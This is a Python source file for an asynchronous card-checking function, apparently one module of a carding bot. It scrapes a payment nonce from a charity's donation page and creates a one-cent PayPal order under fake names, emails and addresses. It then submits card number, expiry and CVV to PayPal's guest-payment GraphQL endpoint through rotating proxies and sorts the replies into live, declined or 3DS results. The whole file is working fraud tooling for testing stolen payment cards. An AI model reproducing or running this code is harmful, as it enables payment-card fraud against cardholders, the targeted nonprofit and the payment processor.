
from asyncio.windows_events import NULL
import aiohttp
import certifi
import ssl
import random
import json
import asyncio
import platform
import names
import random_address

if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())


async def CMDPaypal(cc, proxyrand):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        rand1 = random.randint(1000,9999)
        rand2 = random.randint(10000,99999)

        genaddr = random_address.real_random_address()
        address = genaddr['address1']
        try: 
            City = genaddr['city']
        except KeyError :
            City = "FL"
        State = genaddr['state']
        Zip_Code = genaddr['postalCode']
        try:
            splitter = cc.split('|')
            ccnum    = splitter[0]
            mes      = splitter[1]
            ano      = splitter[2]
            cvv      = splitter[3] 
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                # 'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
            })
            async with session.get('https://schoolforstrings.org/donate/', proxy=str(proxyrand), timeout=15) as resp:
                try :          
                    response = await resp.text()
                    lines = response.split("\n")
                    for i in lines:
                        if "gforms_ppcp_frontend_strings" in i:
                            sucio = i
                            create_order_nonce = sucio.replace('var gforms_ppcp_frontend_strings = ',"").replace(';',"")
                            create_order_nonce = json.loads(create_order_nonce)
                            create_order_nonce = create_order_nonce['create_order_nonce']
                except UnboundLocalError or TypeError:
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️' 

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                'Accept': '*/*',
                'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                'Referer': 'https://schoolforstrings.org/donate/',
                'content-type': 'application/json',
                'Origin': 'https://schoolforstrings.org',
                'Connection': 'keep-alive',
            }

            params = {
                'action': 'gfppcp_create_order',
            }
            correorand = f"KimerJimenezz{rand1}{rand2}@gmail.com"
            data = {
                "nonce":create_order_nonce,
                "data":{
                    "payer":{
                        "name":{
                            "given_name":names.get_first_name(),
                            "surname":names.get_last_name()
                        },
                        "email_address":correorand
                    },
                    "purchase_units":[
                        {
                            "amount":{
                                "value":"0.01",
                                "currency_code":"USD",
                                "breakdown":{
                                    "item_total":{
                                        "value":"0.01",
                                        "currency_code":"USD"
                                    },
                                    "shipping":{
                                        "value":"0",
                                        "currency_code":"USD"
                                    }
                                }
                            },
                            "description":"PayPal Commerce Platform Feed 1",
                            "items":[
                                {
                                    "name":"Other Amount",
                                    "description":"",
                                    "unit_amount":{
                                        "value":"0",
                                        "currency_code":"USD"
                                    },
                                    "quantity":1
                                },
                                {
                                    "name":"Other Amount",
                                    "description":"",
                                    "unit_amount":{
                                        "value":"0.01",
                                        "currency_code":"USD"
                                    },
                                    "quantity":1
                                }
                            ],
                            "shipping":{
                                "name":{
                                    "full_name":names.get_full_name()
                                }
                            }
                        }
                    ],
                    "application_context":{
                        "shipping_preference":"GET_FROM_FILE"
                    }
                },
                "form_id":6,
                "feed_id":"2"

            }
            async with session.post('https://schoolforstrings.org/wp-admin/admin-ajax.php', params=params, headers=headers, json=data, timeout=15, proxy=str(proxyrand)) as resp:
                try :  
                    response = await resp.json()
                    orderID = response['data']['orderID']
                    #idrecurly = response['id']
                except UnboundLocalError or TypeError:
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️' 

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                'Accept': '*/*',
                'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                # 'Accept-Encoding': 'gzip, deflate, br',
                #'Referer': 'https://www.paypal.com/smart/card-fields?sessionID=uid_5628c2812d_mtq6ndu6ndi&buttonSessionID=uid_5ff42877b6_mtq6ndu6ndu&locale.x=es_ES&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jb21wb25lbnRzPWhvc3RlZC1maWVsZHMlMkNidXR0b25zJTJDbWVzc2FnZXMmY2xpZW50LWlkPUFiVkhHTi1GWGxLTWd2ZU1Bbmt3NWxpUTV3WlhZQTVkQ2FDLVlQWU9pbjVEcU9fZDlSaVItMl9KeWdpUEFUeWNnWHlmWHlVT1B6T2t1TUotJmN1cnJlbmN5PVVTRCZpbnRlZ3JhdGlvbi1kYXRlPTIwMjItMDYtMTEmdmF1bHQ9ZmFsc2UmaW50ZW50PWNhcHR1cmUiLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJSb2NrZXRHZW5pdXNfUENQIiwiZGF0YS11aWQiOiJ1aWRfa3p0cGh3c2l1amRmYmpkd3d6cGpycHB4bnJyZHRjIn19&disable-card=&token=3T426684S2194625V',
                'x-country': 'US',
                'content-type': 'application/json',
                'x-app-name': 'standardcardfields',
                'paypal-client-context': orderID,
                'paypal-client-metadata-id': orderID,
                'Origin': 'https://www.paypal.com',
                'Connection': 'keep-alive',
            }
            data = {
                "query":" mutation payWithCard( $token: String! $card: CardInput! $phoneNumber: String $firstName: String $lastName: String $shippingAddress: AddressInput $billingAddress: AddressInput $email: String $currencyConversionType: CheckoutCurrencyConversionType $installmentTerm: Int ) { approveGuestPaymentWithCreditCard( token: $token card: $card phoneNumber: $phoneNumber firstName: $firstName lastName: $lastName email: $email shippingAddress: $shippingAddress billingAddress: $billingAddress currencyConversionType: $currencyConversionType installmentTerm: $installmentTerm ) { flags { is3DSecureRequired } cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } } paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } } } } ",
                "variables":{
                    "token": orderID,
                    "card":{
                        "cardNumber": ccnum,
                        "expirationDate":f"{mes}/{ano}",
                        "postalCode": Zip_Code,
                        "securityCode":cvv
                    },
                    "phoneNumber":f"20{random.randint(0,9)}{random.randint(1700,8065)}{random.randint(8,9)}65",
                    "firstName":names.get_first_name(),
                    "lastName":names.get_last_name(),
                    "billingAddress":{
                        "givenName":names.get_first_name(),
                        "familyName":names.get_last_name(),
                        "line1": address,
                        "line2":"",
                        "city": City,
                        "state": State,
                        "postalCode": Zip_Code,
                        "country":"US"
                    },
                    "shippingAddress":{
                        "givenName":names.get_first_name(),
                        "familyName":names.get_last_name(),
                        "line1": address,
                        "line2":"",
                        "city": City,
                        "state": State,
                        "postalCode": Zip_Code,
                        "country":"US"
                    },
                    "email": correorand,
                    "currencyConversionType":"PAYPAL"
                },
                "operationName":False

            }
            async with session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', json=data,  headers=headers, proxy=str(proxyrand), timeout=15) as resp:
                try :
                    response = await resp.text()

                except UnboundLocalError or TypeError:
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'           

            if int(response.find('NEED_CREDIT_CARD')) > 0 :
                jsonresponse = await resp.json()
                code = "NON_PAYABLE"
                message = jsonresponse['errors'][0]['message']
                await session.close()
                return code, message
            elif int(response.find('CANNOT_CLEAR_3DS_CONTINGENCY')) > 0 :
                jsonresponse = await resp.json()
                message = jsonresponse['errors'][0]['message']
                await session.close()
                return "3DS_ERROR", message
            elif int(response.find('errors')) > 0 :
                jsonresponse = await resp.json()
                try  :
                    code = jsonresponse['errors'][0]['data'][0]['code']
                except KeyError :
                    code = 'NULL'
                except IndexError :
                    code = 'NULL'
                message = jsonresponse['errors'][0]['message']
                await session.close()
                return code, message
            elif int(response.find('is3DSecureRequired')) > 0 :
                await session.close()
                return "CHARGED 0.01$"
            else :
                await session.close()
                print(response)
                return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (asyncio.exceptions.TimeoutError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (aiohttp.client_exceptions.ClientConnectorError):
            return "An unexpected error occurred. Timeout Error. ♻️"
